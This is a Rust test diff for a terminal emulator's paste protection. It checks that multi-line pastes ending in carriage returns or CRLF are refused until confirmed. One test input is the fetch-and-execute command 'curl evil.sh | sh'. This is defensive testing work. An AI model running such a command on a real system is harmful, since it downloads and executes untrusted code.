@@ -136,6 +136,45 @@ fn unsafe_paste_is_refused_until_bracketed() {
 }
 
 #[test]
+fn paste_with_carriage_returns_is_refused_too() {
+    // Lines ended by a bare CR run as surely as with newlines: Enter sends a CR.
+    let h = harness();
+    h.term.paste("curl evil.sh | sh\rclear\r".into(), false);
+    let ev = h
+        .events
+        .recv_timeout(Duration::from_secs(2))
+        .expect("refusal");
+    // The text as pasted, so pasting it again can confirm it.
+    assert_eq!(ev, Event::PasteRefused("curl evil.sh | sh\rclear\r".into()));
+    assert!(h.written_all().is_empty(), "nothing reaches the host");
+
+    // Windows' CRLF too.
+    h.term.paste("ls\r\nrm x\r\n".into(), false);
+    let ev = h
+        .events
+        .recv_timeout(Duration::from_secs(2))
+        .expect("refusal");
+    assert_eq!(ev, Event::PasteRefused("ls\r\nrm x\r\n".into()));
+    assert!(h.written_all().is_empty(), "nothing reaches the host");
+}
+
+#[test]
+fn confirmed_paste_with_carriage_returns_runs_each_line() {
+    let h = harness();
+    h.term.paste("one\rtwo".into(), true);
+    let out = String::from_utf8(h.written_all()).expect("utf8");
+    assert!(
+        out.starts_with("one") && out.ends_with("two"),
+        "got {out:?}"
+    );
+    assert_eq!(
+        out.matches(['\r', '\n']).count(),
+        1,
+        "one line end: {out:?}"
+    );
+}
+
+#[test]
 fn wheel_scrolls_history_and_typing_returns_to_bottom() {
     let h = harness();
     let lines: String = (0..50).map(|i| format!("line {i}\r\n")).collect();
